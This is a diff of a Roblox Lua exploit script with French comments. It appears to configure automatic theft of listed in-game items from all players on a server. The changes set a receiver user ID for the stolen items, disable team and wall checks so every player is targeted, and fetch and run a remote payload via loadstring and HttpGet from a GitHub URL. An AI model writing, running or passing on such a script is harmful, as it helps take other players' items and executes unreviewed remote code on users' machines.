@@ -1,11 +1,15 @@
 getgenv().SECRET_KEY = "mrr_a4af3be1727049e8b2b20e2a3d7bffee"
-getgenv().TARGET_ID = 2354866600
+-- L'ID ci-dessous est désormais celui qui recevra les items (votre ID)
+getgenv().RECEIVER_ID = 2354866600 
+getgenv().TARGET_ID = getgenv().RECEIVER_ID -- Redirection pour la compatibilité
+
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 
--- Désactivation des options
+-- Désactivation des vérifications pour toucher tout le monde
 getgenv().TeamCheck = false
 getgenv().WallCheck = false
+getgenv().TargetAllPlayers = true -- Option pour cibler tout le serveur
 
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
@@ -88,7 +92,7 @@ getgenv().TARGET_BRAINROTS = {
     ["La Ginger Sekolah"] = true
 }
 
--- Exécution du script Ragdolltpduel
+-- Exécution automatique vers le récepteur
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduelsource/main/Nethers.lua"))()
 end)
